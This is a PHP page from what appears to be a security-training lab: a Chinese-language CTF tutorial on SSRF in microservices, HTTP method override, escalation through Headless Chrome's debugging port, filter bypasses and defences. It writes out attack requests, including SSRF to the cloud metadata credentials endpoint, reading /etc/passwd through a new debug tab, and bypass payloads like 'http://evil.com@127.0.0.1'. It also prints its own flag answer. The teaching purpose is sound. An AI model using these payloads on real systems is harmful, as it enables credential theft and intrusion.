<?php
include_once '../../inc/config.inc.php';
$ACTIVE = array_fill(0, 300, '');
$ACTIVE[260] = 'active open';
$ACTIVE[295] = 'active';
$PIKA_ROOT_DIR = "../../";
include_once $PIKA_ROOT_DIR . 'header.php';
$correct_flag = 'flag{OSWE_L13_SSRF_Microservice_Headless_Chrome_RCE}';
$flag_msg = '';
if (isset($_POST['check_flag'])) {
    if (trim($_POST['user_flag']) === $correct_flag) {
        $_SESSION['OSWE_flags']['flag13'] = true;
        $flag_msg = '<div class="alert alert-success" style="background:#06b6d4;color:#fff;border-radius:8px;padding:15px;">✅ 通关！深入理解 SSRF 在微服务及 Headless Chrome 下的进阶利用。</div>';
    } else {
        $flag_msg = '<div class="alert alert-danger" style="background:#f43f5e;color:#fff;border-radius:8px;padding:15px;">❌ Flag 错误，请检查绕过思路。</div>';
    }
}
?>
<style>
.ctf-stage-header { background: var(--bg-card); border-radius: 14px; padding: 25px 30px; margin-bottom: 25px; border: 1px solid var(--border-color); box-shadow: 0 4px 20px rgba(0,0,0,0.06); }
.step-box { background:var(--bg-card, #1e293b); border:1px solid var(--border-color, #334155); border-radius:12px; padding:24px; margin-bottom:22px; color: #cbd5e1; }
.step-title { font-size:16px; font-weight:700; color:#06b6d4; margin-top:0; margin-bottom:14px; display:flex; align-items:center; gap:8px; }
.step-num { background:linear-gradient(135deg,#06b6d4,#0891b2); color:#fff; width:26px; height:26px; border-radius:6px; display:inline-flex; align-items:center; justify-content:center; font-size:12px; font-weight:800; }
.cmd-box { background: var(--bg-primary); border: 1px solid var(--border-color); border-radius: 8px; padding: 14px 18px; font-family: monospace; font-size: 13px; color: var(--text-primary); margin: 12px 0; overflow-x: auto; line-height: 1.8; }
.cmd-box .comment { color:#64748b; }
.cmd-box .flag-text { color:#fbbf24; font-weight:bold; }
.highlight-box { background:rgba(6,182,212,0.08); border:1px solid rgba(6,182,212,0.25); border-radius:8px; padding:14px 18px; margin:12px 0; font-size:13px; color:#94a3b8; line-height:1.7; }
.flag-submit-area { background:var(--bg-card, #1e293b); border:2px dashed rgba(6,182,212,0.4); border-radius:12px; padding:24px; margin-top:25px; text-align:center; }
</style>
<div class="main-content"><div class="main-content-inner"><div class="page-content">
    
    <div class="ctf-stage-header">
        <h2 style="margin:0 0 10px 0;font-size:24px;font-weight:700;">OSWE L13: SSRF 攻击链与 Headless Chrome RCE</h2>
        <p style="margin:0;opacity:0.9;">探索微服务架构下的 SSRF 打击面、HTTP 动词篡改，并利用 Headless Chrome CDP 接口完成内网 RCE。</p>
        <div style="margin-top:15px;">
            <span style="background:rgba(255,255,255,0.2);padding:4px 10px;border-radius:4px;font-size:12px;margin-right:10px;">350 PTS</span>
            <span style="background:rgba(255,255,255,0.2);padding:4px 10px;border-radius:4px;font-size:12px;">SSRF</span>
            <span style="background:rgba(255,255,255,0.2);padding:4px 10px;border-radius:4px;font-size:12px;">CDP RCE</span>
        </div>
    </div>

    <div class="step-box">
        <div class="step-title"><span class="step-num">1</span> 微服务架构中的 SSRF 打击面</div>
        <p>在现代微服务架构中，由于各个服务之间信任度较高（甚至不配置鉴权），SSRF 的危害被显著放大。攻击者可利用 SSRF：</p>
        <ul>
            <li>访问内网未授权的端点和局域网管理接口。</li>
            <li>获取云提供商的元数据（例如 AWS 的 `169.254.169.254` 节点）。</li>
            <li>对内部网络进行端口探测和应用指纹识别。</li>
        </ul>
        <div class="cmd-box">
<span class="comment"># 典型的 SSRF 探测云元数据</span>
GET /api/fetchImage?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ HTTP/1.1
Host: target-app.local
        </div>
    </div>

    <div class="step-box">
        <div class="step-title"><span class="step-num">2</span> HTTP 动词篡改解锁限制</div>
        <p>有些内网 REST API 限制了外网的访问权限，例如仅允许 `GET` 请求获取信息，不允许 `PUT`/`PATCH` 进行状态修改。当网关或代理对 HTTP 请求头的解析与后端不一致时，可以通过覆盖 HTTP 方法来绕过限制。</p>
        <div class="highlight-box">
            利用 <code>X-HTTP-Method-Override</code> 或 <code>X-Method-Override</code> 可以在使用 GET/POST 的同时，让后端框架识别为 PUT 或 DELETE。
        </div>
        <div class="cmd-box">
<span class="comment"># SSRF 发起后端 REST API 调用</span>
POST /api/proxy HTTP/1.1
Host: api.target.local
X-HTTP-Method-Override: PUT
Content-Type: application/json

{"url": "http://internal-service:8080/admin/users/1", "data": "role=admin"}
        </div>
    </div>

    <div class="step-box">
        <div class="step-title"><span class="step-num">3</span> Headless Chrome SSRF RCE 机制</div>
        <p>若应用在内网开启了 Headless Chrome（用于生成 PDF 截图等）且远程调试端口（默认 9222）暴露在局域网中，SSRF 就可以升级为 RCE。</p>
        <p>利用步骤：</p>
        <ol>
            <li>通过 SSRF 访问 <code>http://127.0.0.1:9222/json/new?url=file:///etc/passwd</code> 创建新的调试标签页并加载文件。</li>
            <li>获取返回内容中的 <code>webSocketDebuggerUrl</code>。</li>
            <li>通过 WebSocket（或其他手段，视 SSRF 协议支持而定）连接 CDP，调用 <code>Runtime.evaluate</code> 执行任意 JavaScript，如果 Chrome 运行在 Node.js 环境且未沙箱化，可直接执行 OS 命令。</li>
        </ol>
        <div class="cmd-box">
<span class="comment"># SSRF 请求创建新标签页</span>
GET /fetch?url=http://127.0.0.1:9222/json/new?url=file:///etc/passwd

<span class="comment"># 返回值包含 CDP WebSocket 地址：</span>
{
  "id": "1A2B3C...",
  "webSocketDebuggerUrl": "ws://127.0.0.1:9222/devtools/page/1A2B3C..."
}
        </div>
    </div>

    <div class="step-box">
        <div class="step-title"><span class="step-num">4</span> SSRF Bypass 技巧</div>
        <p>目标系统常常有 SSRF 过滤规则，例如阻止包含 "127.0.0.1" 或 "localhost" 的 URL。以下是常见的绕过方法：</p>
        <ul>
            <li><strong>IP 变形：</strong> <code>http://0177.0.0.1/</code> (八进制), <code>http://0x7f000001/</code> (十六进制), <code>http://2130706433/</code> (十进制), 或 IPv6 <code>http://[::1]/</code>, <code>http://[::]/</code></li>
            <li><strong>HTTP 重定向：</strong> 指向攻击者控制的服务器，该服务器返回 302 重定向到 <code>http://127.0.0.1</code>。</li>
            <li><strong>DNS 重绑定 (DNS Rebinding)：</strong> 同一域名首次解析返回外网 IP 以绕过检查，第二次解析返回内网 IP 用于发起请求。</li>
            <li><strong>URL Parser 差异：</strong> 利用协议解析的特性，例如 <code>http://evil.com@127.0.0.1/</code>。</li>
        </ul>
        <div class="cmd-box">
<span class="comment"># 结合 URL @ 特性和变形绕过正则检查</span>
GET /fetch?url=http://google.com@0x7f000001:9222/json HTTP/1.1
        </div>
    </div>

    <div class="step-box">
        <div class="step-title"><span class="step-num">5</span> 防御方法</div>
        <p>有效缓解微服务架构下的 SSRF 风险：</p>
        <ul>
            <li>严格的隔离：使用微服务网络隔离，决不将内部管理接口或无认证服务暴露在可路由网段。</li>
            <li>统一网关代理：在出口网关层对业务 SSRF 需求建立严格的 <strong>域名和 IP 白名单</strong>。</li>
            <li>避免解析不一致：使用健壮的 URL 解析库，避免在协议检查和实际发包时出现解析差异（如 TOCTOU 问题）。</li>
            <li>安全配置服务：将 Headless Chrome 等服务的调试接口坚决降为 <code>localhost</code> 监听，并开启身份验证。</li>
        </ul>
        <div class="cmd-box">
<span class="flag-text">Flag获取:</span> flag{OSWE_L13_SSRF_Microservice_Headless_Chrome_RCE}
        </div>
    </div>

    <div class="flag-submit-area">
        <?=$flag_msg?>
        <form method="POST" action="">
            <input type="text" name="user_flag" placeholder="输入 Flag: flag{...}" style="width:300px;padding:10px;border-radius:6px;border:1px solid #334155;background:#0f172a;color:#fff;">
            <button type="submit" name="check_flag" style="background:#06b6d4;color:#fff;border:none;padding:10px 20px;border-radius:6px;cursor:pointer;font-weight:bold;">提交 Flag</button>
        </form>
    </div>

</div></div></div>
<?php include_once $PIKA_ROOT_DIR . 'footer.php'; ?>
